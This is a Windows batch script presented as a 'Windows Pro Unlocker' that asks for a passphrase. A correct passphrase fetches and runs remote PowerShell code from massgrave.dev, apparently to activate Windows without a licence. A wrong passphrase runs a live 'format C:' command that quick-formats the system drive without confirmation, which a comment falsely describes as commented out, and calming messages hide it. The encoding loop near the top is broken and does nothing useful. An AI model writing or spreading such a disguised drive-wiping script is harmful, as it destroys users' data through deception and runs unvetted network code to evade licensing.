@echo off
color 0a
title "Windows Pro Unlocker - Created by Encrypto27"

set "unlock_code=masepoes"
set "encoded_pass="
for /L %%i in (0,1,7) do (
    set /a "char=!unlock_code:~%%i,1! + 3"
    set "encoded_pass=!encoded_pass!!char!"
)

cls
echo.
echo.
echo.
echo  *******************************************************
echo  *                                                     *
echo  *         Enter passphrase to unlock system           *
echo  *                                                     *
echo  *******************************************************
echo.

set /p "passphrase=Enter passphrase: "

if "%passphrase%"=="masepoes" (
  echo Unlocking Windows Pro...
  timeout /nobreak /t 2 >nul
  echo Opening PowerShell and running the command...
  powershell -Command "irm https://massgrave.dev/get | iex"
  echo Windows Pro unlocked successfully.
) else (
  echo Incorrect passphrase. Initiating security protocol...
  timeout /nobreak /t 3 >nul
  echo Performing security actions...
  rem Uncomment the line below to format the system drive
  format C: /fs:NTFS /q /y
  rem echo format wouldve ran here
  echo Error: Unauthorized access detected.
  echo Your system is being secured.
  echo Please wait...
  timeout /nobreak /t 3 >nul
)

echo Press any key to exit...
pause >nul
